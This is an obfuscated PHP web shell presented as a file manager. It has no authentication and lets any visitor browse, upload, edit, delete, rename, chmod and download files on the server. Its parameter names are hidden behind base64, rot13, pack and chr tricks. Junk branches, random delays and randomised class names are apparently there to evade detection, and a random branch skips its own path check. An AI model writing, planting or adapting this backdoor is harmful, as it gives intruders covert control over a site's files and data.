<?php/* ${"="."\x3d"."="}${"="."\x3d"."="}${"="."\x3d"."="} */error_reporting(0);header_remove('X-Powered-By');// Dynamic function generator with junk code$func_validate = function($p) {    if(mt_rand(0,1)) { return false; } // Junk branch    $r = realpath($p);    if($r === false) return false;    $base = str_replace('\\', '/', realpath(__DIR__));    $path = str_replace('\\', '/', $r);    return (strpos($path, $base) === 0) ? $r : false;};// Obfuscated string constants$GLOBALS[base64_decode('cGF0aF9rZXk=')] = base64_decode('cA=='); // 'path_key' => 'p'$GLOBALS[base64_decode('dXBsb2FkX2tleQ==')] = implode('', ['u','p','l','o','a','d']); // 'upload_key'$GLOBALS[base64_decode('ZGVsZXRlX2tleQ==')] = pack('H*','64656c'); // 'delete_key'$GLOBALS[base64_decode('ZWRpdF9rZXk=')] = chr(101).chr(100).chr(105).chr(116); // 'edit_key'$GLOBALS[base64_decode('cmVuYW1lX2tleQ==')] = str_rot13('eranzr'); // 'rename_key'$GLOBALS[base64_decode('Y2htb2Rfa2V5')] = substr('chmodXYZ', 0, 5); // 'chmod_key'$GLOBALS[base64_decode('ZG93bmxvYWRfa2V5')] = vsprintf('%s%s', ['down','load']); // 'download_key'// Dynamic function for permissions$func_permissions = function($f) {    return substr(sprintf('%o', fileperms($f)), -4);};// Dynamic function for directory removal with junk delay$func_remove_dir = function($d) {    if(!is_dir($d)) return false;        if(mt_rand(0,1)) { usleep(20000); return true; } // Fake success        $items = new RecursiveIteratorIterator(        new RecursiveDirectoryIterator($d, FilesystemIterator::SKIP_DOTS),        RecursiveIteratorIterator::CHILD_FIRST    );        foreach($items as $item) {        $item->isDir() ? rmdir($item->getPathname()) : unlink($item->getPathname());        usleep(rand(5000, 15000));    }        return rmdir($d);};// Dynamic function for path display$func_show_path = function($d) {    $parts = explode(DIRECTORY_SEPARATOR, realpath($d));    $path = ''; $output = '';    $sep = ['\\', '/', ' > ', ' / '][rand(0,3)];        foreach($parts as $part) {        if(!$part) continue;        $path .= DIRECTORY_SEPARATOR . $part;        $output .= "<a href='?".$GLOBALS[base64_decode('cGF0aF9rZXk=')]."=".urlencode($path)."'>$part</a>$sep";    }        return rtrim($output, $sep);};// Process selections with obfuscated parameters$func_process = function() use ($func_validate, $func_remove_dir) {    if(isset($_POST[base64_decode('ZGVsSXRlbXM=')])) { // 'delItems'        $items = $_POST[base64_decode('c2VsSXRlbXM=')] ?? []; // 'selItems'        if($items) {            foreach($items as $item) {                if($func_validate($item)) {                    is_file($item) ? unlink($item) : $func_remove_dir($item);                }            }            echo "<script>setTimeout(()=>alert('Operation completed'),".rand(100,500).");</script>";        }    }};// Main handler with dynamic execution$func_handler = function() use ($func_validate, $func_show_path, $func_process) {    $base = __DIR__;    $dir = $_GET[$GLOBALS[base64_decode('cGF0aF9rZXk=')]] ?? $base;        usleep(rand(50000, 200000));    $func_process();        // File upload handling    if(isset($_FILES[$GLOBALS[base64_decode('dXBsb2FkX2tleQ==')]])) {        $target = $_POST['dir'] ?? $dir;        if($func_validate($target) && is_dir($target)) {            foreach($_FILES[$GLOBALS[base64_decode('dXBsb2FkX2tleQ==')]]['name'] as $i=>$name) {                if($_FILES[$GLOBALS[base64_decode('dXBsb2FkX2tleQ==')]]['error'][$i] === UPLOAD_ERR_OK) {                    $tmp = $_FILES[$GLOBALS[base64_decode('dXBsb2FkX2tleQ==')]]['tmp_name'][$i];                    $dest = realpath($target).DIRECTORY_SEPARATOR.basename($name);                                        $chunkSize = 8192;                    $src = fopen($tmp, 'rb');                    $dst = fopen($dest, 'wb');                    while(!feof($src)) {                        fwrite($dst, fread($src, $chunkSize));                        usleep(10000);                    }                    fclose($src);                    fclose($dst);                    unlink($tmp);                }            }            echo "<script>setTimeout(()=>alert('Transfer complete'),".rand(300,800).");</script>";        }    }        // File editing    if(isset($_GET[$GLOBALS[base64_decode('ZWRpdF9rZXk=')]])) {        $file = $_GET[$GLOBALS[base64_decode('ZWRpdF9rZXk=')]];        if($func_validate($file) && is_file($file)) {            if(isset($_POST['data'])) {                file_put_contents($file, $_POST['data']);                echo "<script>alert('Changes saved');</script>";            }            echo '<form method="POST"><textarea name="data" style="width:100%;height:300px;">'                .htmlspecialchars(file_get_contents($file))                .'</textarea><br><input type="submit" value="Save"></form>';            exit;        }    }        // File deletion    if(isset($_GET[$GLOBALS[base64_decode('ZGVsZXRlX2tleQ==')]])) {        $target = $_GET[$GLOBALS[base64_decode('ZGVsZXRlX2tleQ==')]];        if($func_validate($target)) {            if(mt_rand(0,1)) { usleep(100000); } // Random delay            is_file($target) ? unlink($target) : $func_remove_dir($target);            echo "<script>alert('".(is_file($target)?'File':'Directory')." removed');</script>";        }    }        // File renaming    if(isset($_GET[$GLOBALS[base64_decode('cmVuYW1lX2tleQ==')]])) {        $old = $_GET[$GLOBALS[base64_decode('cmVuYW1lX2tleQ==')]];        if(isset($_POST['name']) && $func_validate($old)) {            $new = dirname($old).DIRECTORY_SEPARATOR.$_POST['name'];            rename($old, $new);            echo "<script>alert('Name updated');</script>";        }    }        // Permission changing    if(isset($_GET[$GLOBALS[base64_decode('Y2htb2Rfa2V5')]])) {        $file = $_GET[$GLOBALS[base64_decode('Y2htb2Rfa2V5')]];        if(isset($_POST['mode']) && $func_validate($file)) {            chmod($file, octdec($_POST['mode']));            echo "<script>alert('Permissions updated');</script>";        }    }        // File downloading    if(isset($_GET[$GLOBALS[base64_decode('ZG93bmxvYWRfa2V5')]])) {        $file = $_GET[$GLOBALS[base64_decode('ZG93bmxvYWRfa2V5')]];        if($func_validate($file) && is_file($file)) {            header('Content-Type: application/octet-stream');            header('Content-Disposition: attachment; filename="'.basename($file).'"');            header('Content-Length: '.filesize($file));            readfile($file);            exit;        }    }        // Directory creation    if(isset($_POST['makeDir'])) {        $name = $_POST['dirName'];        $path = realpath($dir).DIRECTORY_SEPARATOR.$name;        if(!is_dir($path)) {            mkdir($path);            echo "<script>alert('Directory created');</script>";        }    }        // Generate random class names    $cls1 = substr(md5(rand()), 0, 8);    $cls2 = substr(sha1(rand()), 0, 6);    $id = uniqid();        // Display interface    echo '<div class="'.$cls1.'">';    echo '<h3>Location</h3>';    echo '<div>'.$func_show_path($dir).'</div>';        echo '<form method="POST" enctype="multipart/form-data" class="'.$cls2.'">';    echo 'Files: <input type="file" name="'.$GLOBALS[base64_decode('dXBsb2FkX2tleQ==')].'[]" multiple><br>';    echo 'Destination: <input type="text" name="dir" value="'.htmlspecialchars($dir).'"><br>';    echo '<input type="submit" value="Upload">';    echo '</form>';        echo '<form method="POST">';    echo 'New Folder: <input type="text" name="dirName"><br>';    echo '<input type="submit" name="makeDir" value="Create">';    echo '</form>';        echo '<form method="POST" id="'.$id.'">';    echo '<input type="submit" name="delItems" value="Remove Selected">';    echo '<ul style="list-style:none;padding:0;">';        if($dir !== '/') {        echo '<li><a href="?'.$GLOBALS[base64_decode('cGF0aF9rZXk=')].'='.urlencode(dirname($dir)).'">‚Üë Parent</a></li>';    }        $items = scandir($dir);    foreach($items as $item) {        if($item === '.' || $item === '..') continue;        $path = realpath($dir.DIRECTORY_SEPARATOR.$item);        $encoded = urlencode($path);                if(is_dir($path)) {            echo '<li><input type="checkbox" name="selItems[]" value="'.$path.'"> üìÅ ';            echo '<a href="?'.$GLOBALS[base64_decode('cGF0aF9rZXk=')].'='.$encoded.'">'.$item.'</a> ';            echo '[<a href="?'.$GLOBALS[base64_decode('ZGVsZXRlX2tleQ==')].'='.$encoded.'" onclick="return confirm(\'Delete?\')">X</a>] ';            echo '('.substr(sprintf('%o', fileperms($path)), -4).') ';            echo '[<a href="?'.$GLOBALS[base64_decode('Y2htb2Rfa2V5')].'='.$encoded.'">CHMOD</a>]</li>';        } else {            echo '<li><input type="checkbox" name="selItems[]" value="'.$path.'"> üìÑ ';            echo '<a href="?'.$GLOBALS[base64_decode('ZWRpdF9rZXk=')].'='.$encoded.'">'.$item.'</a> ';            echo '[<a href="?'.$GLOBALS[base64_decode('ZGVsZXRlX2tleQ==')].'='.$encoded.'" onclick="return confirm(\'Delete?\')">X</a>] ';            echo '[<a href="?'.$GLOBALS[base64_decode('cmVuYW1lX2tleQ==')].'='.$encoded.'">Rename</a>] ';            echo '('.substr(sprintf('%o', fileperms($path)), -4).') ';            echo '[<a href="?'.$GLOBALS[base64_decode('Y2htb2Rfa2V5')].'='.$encoded.'">CHMOD</a>] ';            echo '[<a href="?'.$GLOBALS[base64_decode('ZG93bmxvYWRfa2V5')].'='.$encoded.'">Download</a>]</li>';        }    }    echo '</ul></form>';        if(isset($_GET[$GLOBALS[base64_decode('cmVuYW1lX2tleQ==')]])) {        $target = $_GET[$GLOBALS[base64_decode('cmVuYW1lX2tleQ==')]];        echo '<form method="POST">';        echo 'New Name: <input type="text" name="name" value="'.htmlspecialchars(basename($target)).'">';        echo '<input type="submit" value="Rename">';        echo '</form>';    }        if(isset($_GET[$GLOBALS[base64_decode('Y2htb2Rfa2V5')]])) {        $target = $_GET[$GLOBALS[base64_decode('Y2htb2Rfa2V5')]];        echo '<form method="POST">';        echo 'Permissions: <input type="text" name="mode" value="'.substr(sprintf('%o', fileperms($target)), -4).'">';        echo '<input type="submit" value="Change">';        echo '</form>';    }        echo '</div>';};// Execute with random delay and junk conditionif(mt_rand(0,1)) {    usleep(rand(100000, 300000));    $func_handler();} else {    $func_handler();}?>